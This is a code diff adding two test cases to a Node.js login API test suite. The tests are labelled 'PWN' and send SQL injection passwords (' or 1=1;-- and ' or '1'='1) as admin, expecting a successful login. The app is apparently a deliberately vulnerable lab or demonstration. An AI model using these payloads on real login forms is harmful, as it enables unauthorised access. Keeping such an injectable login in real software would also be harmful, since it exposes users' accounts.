@@ -35,4 +35,24 @@ describe("Basic tests", function () {
       });
   });
 
+  it("PWN /api/login: Aggressive SQL injection login should work", function (done) {
+    chai.request(app)
+      .post("/api/login")
+      .send({ username: "admin", password: "' or 1=1;-- " })
+      .end(function (err, res) {
+        res.should.have.status(200)
+        done()
+      });
+  });
+
+  it("PWN /api/login: Non-aggressive SQL injection login should work", function (done) {
+    chai.request(app)
+      .post("/api/login")
+      .send({ username: "admin", password: "' or '1'='1" })
+      .end(function (err, res) {
+        res.should.have.status(200)
+        done()
+      });
+  });
+
 });
